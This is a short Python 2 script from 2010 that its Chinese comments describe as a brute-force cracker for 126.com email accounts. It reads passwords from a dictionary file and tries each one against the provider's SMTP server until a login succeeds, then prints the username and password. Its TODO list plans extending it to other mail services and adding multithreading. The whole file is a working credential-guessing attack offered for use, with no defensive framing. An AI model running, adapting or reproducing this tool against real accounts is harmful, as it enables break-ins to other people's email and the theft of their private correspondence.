# /usr/bin/env python
# coding:utf-8
# Author: x140m1ng <lininruc[at]gmail[dot]com>
# Version: 0.1
# Date: 2010-10-12
#
# 126邮箱暴力破解
# 作者: x140m1ng 
# 邮箱: <lininruc[at]gmail[dot]com>
# 博客: http://hi.baidu.com/ruclin
# 原理:
# 		利用smtp登录,从文本字典(pass.txt)读取，然后不断地枚举密码.
#       直到接收到字符串"Authentication successful"表示成功.
#		用poplib枚举也一样,基本相似的原理.
# TODO:
#  		1、可以扩展成别的邮箱的,基本上原理一样
#		2、成功后自动发邮件通知
#		3、改成多线程
#		4、增强稳定性

import smtplib ,sys ,time

def print_usage():
	print "smtp.py version:0.1"
	print "Author:x140m1ng"
	print "Example: python smtp.py XX@126.com "
	return

def print_banner():
	return

def main():
	server = "smtp.126.com"
	print_banner()
	if len(sys.argv) != 2:
		print_usage()
		sys.exit(1)
	else:
		# parse para
		user = sys.argv[1]
		file = open("pass.txt","r")
		passwds = file.readlines()
		
		#Connect smtp and Brute-force
		
		for passwd in passwds:
			passwd = passwd.replace("\n","")
			try:
				smtp = smtplib.SMTP()
				#smtp.set_debuglevel(1)
				smtp.connect(server)
				print "trying ",passwd
				response = smtp.login(user,passwd)
				smtp.quit()
				if "Authentication successful" in response:
					print "[+] user:%s \n[+] passwd:%s" % (user,passwd)
					return
			except:
				time.sleep(1)
				pass
		print "[+] sorry ,not found!"
		
if __name__=="__main__":
	main()
